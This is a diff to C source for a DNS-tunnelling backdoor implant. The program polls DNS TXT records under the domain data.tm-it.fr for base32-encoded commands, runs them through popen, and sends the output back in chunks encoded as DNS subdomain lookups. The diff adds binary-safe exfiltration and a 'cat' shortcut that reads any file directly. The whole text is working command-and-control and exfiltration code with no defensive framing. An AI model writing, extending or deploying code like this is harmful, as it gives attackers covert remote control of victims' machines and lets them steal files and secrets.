@@ -10,7 +10,9 @@
 
 #define BASE_DOMAIN "data.tm-it.fr"
 #define CHUNK_SIZE 30 
-#define MAX_OUTPUT_SIZE 8192
+#define MAX_OUTPUT_SIZE 50000
+
+static int return_value = 0;
 
 int base32_char_to_val(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
@@ -91,16 +93,15 @@ void get_dns_txt_record(const char *fqdn, char *output_txt, size_t max_len) {
     }
 }
 
-void exfiltrate_data(const char *data, const char *id_machine) {
-    size_t total_len = strlen(data);
+void exfiltrate_data(const unsigned char *data, const char *id_machine, size_t len) {
     size_t offset = 0;
     int chunk_index = 0;
-    char chunk[CHUNK_SIZE + 1];
+    unsigned char chunk[CHUNK_SIZE + 1];
     char encoded_chunk[128];
     char fqdn[254];
 
-    while (offset < total_len) {
-        size_t current_chunk_size = total_len - offset;
+    while (offset < len) {
+        size_t current_chunk_size = len - offset;
         if (current_chunk_size > CHUNK_SIZE) {
             current_chunk_size = CHUNK_SIZE;
         }
@@ -109,7 +110,7 @@ void exfiltrate_data(const char *data, const char *id_machine) {
         memcpy(chunk, data + offset, current_chunk_size);
 
         memset(encoded_chunk, 0, sizeof(encoded_chunk));
-        base32_encode((unsigned char*)chunk, current_chunk_size, encoded_chunk);
+        base32_encode(chunk, current_chunk_size, encoded_chunk);
 
         snprintf(fqdn, sizeof(fqdn), "%d.%s.cmd.%s.%s", chunk_index, encoded_chunk, id_machine, BASE_DOMAIN);
         printf("Sending chunk #%d : %s\n", chunk_index, fqdn);
@@ -122,17 +123,65 @@ void exfiltrate_data(const char *data, const char *id_machine) {
     }
 }
 
-void execute_command(const char *cmd, char *output, size_t max_size) {
-    FILE *fp = popen(cmd, "r");
-    if (fp == NULL) {
-        snprintf(output, max_size, "[-] Échec d'exécution de popen");
-        return;
+size_t execute_cat_command(char *cmd, unsigned char *output, size_t max_size) {
+    for (int i = 0; i != 4; i++) {
+        cmd++;
+    }
+    printf("Executing command : %s\n", cmd);
+
+    FILE *file = fopen(cmd, "rb");
+    if (file == NULL) {
+        perror("can't open file");
+        return_value = -1;
+        return 0;
     }
 
-    size_t bytes_read = fread(output, 1, max_size - 1, fp);
+    fseek(file, 0, SEEK_END);
+    long length = ftell(file);
+    rewind(file);
+
+    if (length > (long)max_size) {
+        printf("file is too large to read\n");
+        fclose(file);
+        return_value = -1;
+        return 0;
+    }
+
+    size_t red = fread(output, 1, length, file);
+    
+    if (red != (size_t)length) {
+        perror("can't read file or file is truncated");
+        fclose(file);
+        return_value = -1;
+        return length;
+    }
+
+    fclose(file);
+
+    return red;
+}
+
+size_t execute_command(char *cmd, unsigned char *output, size_t max_size) {
+    size_t bytes_read;
+    printf("Executing command : %s\n", cmd);
+    if (sizeof(cmd) >= 4 && strncmp(cmd, "cat", 3) == 0) {
+        bytes_read = execute_cat_command(cmd, output, max_size);
+        if (return_value == -1) {
+            return 0;
+        }
+        return bytes_read;
+    }
+    FILE *fp = popen(cmd, "r");
+    if (fp == NULL) {
+        snprintf((char*)output, max_size, "[-] Échec d'exécution de popen");
+        return 0;
+    }
+
+    bytes_read = fread(output, 1, max_size - 1, fp);
     output[bytes_read] = '\0';
     
     pclose(fp);
+    return bytes_read;
 }
 
 void get_machine_id(char *machine_id) {
@@ -147,9 +196,10 @@ int main() {
     char id_machine[33] = {0};
     char command[256] = {0};
     char fqdn[254] = {0};
-    char *cmd_output = malloc(MAX_OUTPUT_SIZE);
+    unsigned char *cmd_output = malloc(MAX_OUTPUT_SIZE * sizeof(unsigned char));
     char decoded_cmd[256];
     int dec_len;
+    size_t output_len;
 
     get_machine_id(id_machine);
     if (strlen(id_machine) == 0) {
@@ -169,9 +219,9 @@ int main() {
             dec_len = decode_base32(command, (uint8_t*)decoded_cmd);
             decoded_cmd[dec_len] = '\0';
             memset(cmd_output, 0, MAX_OUTPUT_SIZE);
-            execute_command(decoded_cmd, cmd_output, MAX_OUTPUT_SIZE);
+            output_len = execute_command(decoded_cmd, cmd_output, MAX_OUTPUT_SIZE);
 
-            exfiltrate_data(cmd_output, id_machine);
+            exfiltrate_data(cmd_output, id_machine, output_len);
 
             snprintf(fqdn, sizeof(fqdn), "finished.cmd.%s.%s", id_machine, BASE_DOMAIN);
             get_dns_txt_record(fqdn, NULL, 0);
